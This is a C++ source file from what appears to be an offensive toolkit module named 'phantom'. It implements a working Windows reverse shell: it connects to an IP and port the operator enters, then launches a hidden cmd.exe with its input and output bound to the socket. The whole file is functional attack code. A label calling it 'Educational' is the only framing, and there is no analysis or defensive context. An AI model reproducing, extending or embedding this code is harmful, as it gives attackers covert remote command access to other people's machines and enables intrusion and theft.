#include "phantom/modules.h"
#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

namespace phantom::modules {
    void run_reverse_shell() {
        std::cout << "\n=== Reverse Shell (Educational) ===\n";
        std::cout << "Target IP: ";
        std::string ip;
        std::getline(std::cin, ip);
        
        std::cout << "Target Port: ";
        std::string portStr;
        std::getline(std::cin, portStr);
        if (ip.empty() || portStr.empty()) return;
        int port = std::stoi(portStr);

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

        SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

        std::cout << "Connecting to " << ip << ":" << port << "...\n";
        if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            std::cerr << "Failed to connect.\n";
            closesocket(sock);
            WSACleanup();
            return;
        }

        STARTUPINFO si;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi;
        char cmd[] = "cmd.exe";
        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, (STARTUPINFOA*)&si, &pi)) {
            std::cerr << "Failed to create process.\n";
        } else {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        closesocket(sock);
        WSACleanup();
        std::cout << "===================================\n";
    }
}
